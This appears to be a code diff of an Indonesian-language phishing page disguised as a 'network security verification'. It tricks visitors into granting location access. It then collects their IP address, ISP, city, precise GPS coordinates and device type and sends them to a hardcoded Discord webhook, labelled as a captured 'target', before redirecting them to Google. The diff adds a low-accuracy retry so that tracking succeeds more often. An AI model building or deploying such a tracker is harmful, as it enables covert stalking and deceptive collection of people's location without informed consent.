@@ -5,96 +5,175 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sistem Verifikasi Jaringan</title>
     <style>
-        body { background: #0b0e11; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        body { background: #0b0e11; color: #ffffff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { text-align: center; background: #15191d; padding: 35px; border-radius: 15px; border: 1px solid #2d333b; width: 310px; }
-        .btn { background: #00a2ff; color: white; border: none; padding: 14px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; font-size: 16px; margin-top: 10px; }
-        #location-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 100; justify-content: center; align-items: center; }
-        .modal-content { background: #ffffff; color: #333; padding: 25px; border-radius: 12px; width: 80%; text-align: center; }
-        .modal-btn { background: #007bff; color: white; border: none; padding: 12px; border-radius: 6px; font-weight: bold; width: 100%; margin-top: 15px; }
+        .btn { background: #00a2ff; color: white; border: none; padding: 14px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
+        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 100; justify-content: center; align-items: center; }
+        .m-card { background: #fff; color: #000; padding: 25px; border-radius: 15px; width: 80%; text-align: center; }
+        .error-msg { color: #ff4444; font-size: 12px; margin-top: 10px; display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <div style="font-size: 40px; margin-bottom: 15px;">🔒</div>
     <h3>Verifikasi Keamanan</h3>
-    <p style="color: #848d97; font-size: 14px;">Klik tombol di bawah untuk memverifikasi koneksi Anda.</p>
-    <button class="btn" onclick="showModal()">LANJUTKAN</button>
+    <p style="color: #848d97; font-size: 14px;">Klik untuk memverifikasi koneksi Anda.</p>
+    <button class="btn" onclick="document.getElementById('modal').style.display='flex'">LANJUTKAN</button>
 </div>
 
-<div id="location-modal">
-    <div class="modal-content">
-        <h4 style="margin: 0; color: #000;">Izin Lokasi</h4>
-        <p style="font-size: 14px; color: #555;">Situs ini memerlukan akses lokasi untuk memvalidasi akses wilayah Anda.</p>
-        <button class="modal-btn" onclick="startTracking()">IZINKAN</button>
+<div id="modal">
+    <div class="m-card">
+        <h4>Izin Akses</h4>
+        <p style="font-size: 13px;">Aktifkan lokasi untuk memvalidasi jaringan (Wajib Android 10+).</p>
+        <button onclick="getGPS()" style="background:#007bff; color:#fff; border:none; padding:12px; width:100%; border-radius:5px; font-weight:bold;">IZINKAN</button>
+        <div id="gpsError" class="error-msg">Gagal mendapatkan lokasi. Coba aktifkan GPS manual.</div>
     </div>
 </div>
 
 <script>
-    const WEBHOOK_URL = "https://discord.com/api/webhooks/1473582220013863104/pPWzhnsRh2Is_8Qd0a7X99kBKp_oXa6TINpLovVI3IfojbB2GazCBZsztflCxmCtxWb1"; // Ganti ini!
+    // GANTI DENGAN WEBHOOK DISCORD ASLI ANDA
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1473582220013863104/pPWzhnsRh2Is_8Qd0a7X99kBKp_oXa6TINpLovVI3IfojbB2GazCBZsztflCxmCtxWb1";
 
-    function showModal() {
-        document.getElementById('location-modal').style.display = 'flex';
-    }
-
-    async function startTracking() {
-        document.getElementById('location-modal').style.display = 'none';
-        const btn = document.querySelector('.btn');
-        btn.innerText = "Memproses...";
+    async function getGPS() {
+        // Tampilkan loading
+        const btn = document.querySelector('#modal button');
+        const originalText = btn.innerText;
+        btn.innerText = 'MENGAMBIL DATA...';
         btn.disabled = true;
-
-        // 1. Ambil IP (Gunakan 2 API berbeda agar tidak N/A)
-        let netInfo = { ip: "N/A", org: "N/A", loc: "N/A" };
+        
+        // 1. Ambil IP dulu
+        let net = { ip: "N/A", org: "N/A", city: "N/A", region: "N/A", country: "N/A" };
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            netInfo = { ip: data.ip, org: data.org, loc: `${data.city}, ${data.region}` };
+            const d = await res.json();
+            net = { 
+                ip: d.ip, 
+                org: d.org || "Unknown", 
+                city: d.city || "Unknown",
+                region: d.region || "Unknown",
+                country: d.country_name || "Unknown"
+            };
+            console.log("IP Data:", net);
         } catch (e) {
-            try {
-                const res2 = await fetch('https://api.ipify.org?format=json');
-                const data2 = await res2.json();
-                netInfo.ip = data2.ip;
-            } catch (e2) {}
+            console.log("Gagal ambil IP:", e);
         }
 
-        // 2. Ambil GPS (Optimasi untuk Android 10+)
+        // 2. Minta GPS dengan konfigurasi yang lebih baik
         if (navigator.geolocation) {
+            // Opsi untuk mendapatkan lokasi yang akurat
+            const options = {
+                enableHighAccuracy: true,
+                timeout: 15000,  // 15 detik timeout
+                maximumAge: 0
+            };
+            
             navigator.geolocation.getCurrentPosition(
-                (pos) => sendData(netInfo, pos),
-                (err) => sendData(netInfo, null),
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                // Sukses mendapatkan lokasi
+                (position) => {
+                    console.log("GPS Success:", position.coords);
+                    sendToDiscord(net, position);
+                    document.getElementById('modal').style.display = 'none';
+                },
+                // Error mendapatkan lokasi
+                (error) => {
+                    console.log("GPS Error:", error.code, error.message);
+                    
+                    // Coba sekali lagi dengan akurasi rendah
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            console.log("GPS Success (low accuracy):", position.coords);
+                            sendToDiscord(net, position);
+                            document.getElementById('modal').style.display = 'none';
+                        },
+                        (error2) => {
+                            console.log("GPS Failed completely:", error2);
+                            document.getElementById('gpsError').style.display = 'block';
+                            btn.innerText = originalText;
+                            btn.disabled = false;
+                            
+                            // Tetap kirim data meski tanpa GPS
+                            if(confirm("Gagal mendapatkan lokasi. Tetap lanjutkan?")) {
+                                sendToDiscord(net, null);
+                                document.getElementById('modal').style.display = 'none';
+                            }
+                        },
+                        { enableHighAccuracy: false, timeout: 8000 }
+                    );
+                },
+                options
             );
         } else {
-            sendData(netInfo, null);
+            alert("Browser tidak mendukung GPS");
+            sendToDiscord(net, null);
+            document.getElementById('modal').style.display = 'none';
         }
     }
 
-    async function sendData(net, pos) {
+    function sendToDiscord(net, position) {
+        let gpsField = { name: "📍 GPS", value: "❌ TIDAK ADA (Gagal mendapatkan lokasi)", inline: false };
+        
+        if (position && position.coords) {
+            const lat = position.coords.latitude;
+            const lng = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            
+            gpsField = { 
+                name: "📍 GPS", 
+                value: `[Buka Google Maps](https://www.google.com/maps?q=${lat},${lng})\nAkurasi: ${Math.round(accuracy)} meter`, 
+                inline: false 
+            };
+        }
+
+        // Ambil informasi device lebih detail
+        const userAgent = navigator.userAgent;
+        let deviceInfo = "Unknown";
+        
+        if (userAgent.includes("Android")) {
+            deviceInfo = userAgent.split('Android')[1]?.split(';')[0] || "Android";
+        } else if (userAgent.includes("iPhone")) {
+            deviceInfo = "iPhone";
+        } else if (userAgent.includes("Windows")) {
+            deviceInfo = "Windows PC";
+        }
+
         const payload = {
             embeds: [{
-                title: "🎯 Target Terdeteksi (Android Optimized)",
-                color: 3447003,
+                title: "📱 Data Target Berhasil Diambil",
+                color: 3066993, // Hijau
                 fields: [
                     { name: "🌐 IP Address", value: `\`${net.ip}\``, inline: true },
-                    { name: "🏢 Provider", value: `\`${net.org}\``, inline: true },
-                    { name: "📍 Lokasi IP", value: `${net.loc}`, inline: false },
-                    { name: "📍 GPS", value: pos ? `[Cek di Google Maps](https://www.google.com/search?q=https://www.google.com/maps%3Fq%3D-6.887248,107.615392${pos.coords.latitude},${pos.coords.longitude})` : "❌ **AKSES DIBLOKIR**", inline: false },
-                    { name: "📱 Perangkat", value: `\`${navigator.userAgent.split('(')[1].split(')')[0]}\`` }
+                    { name: "🏢 ISP/Provider", value: `\`${net.org}\``, inline: true },
+                    { name: "📍 Kota", value: `\`${net.city}, ${net.region}, ${net.country}\``, inline: true },
+                    gpsField,
+                    { name: "📱 Device Info", value: `\`${deviceInfo}\``, inline: true },
+                    { name: "⏰ Waktu", value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true }
                 ],
-                footer: { text: "Mata Fauzan v3.3 • " + new Date().toLocaleString('id-ID') }
+                footer: { text: "GPS Tracker v2.0" }
             }]
         };
 
-        // Kirim data via Beacon agar tetap terkirim meski browser ditutup
-        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
-        navigator.sendBeacon(WEBHOOK_URL, blob);
-
-        // Tunggu sebentar lalu buang ke Google
-        setTimeout(() => {
-            window.location.href = "https://www.google.com";
-        }, 1500);
+        // Kirim ke Discord
+        fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+        .then(response => {
+            if(response.ok) {
+                console.log("Data terkirim!");
+                setTimeout(() => { 
+                    window.location.href = "https://www.google.com"; 
+                }, 2000);
+            } else {
+                console.log("Gagal kirim ke Discord");
+                alert("Data gagal dikirim, cek webhook URL");
+            }
+        })
+        .catch(err => {
+            console.error("Error:", err);
+            alert("Network error");
+        });
     }
 </script>
-
 </body>
 </html>
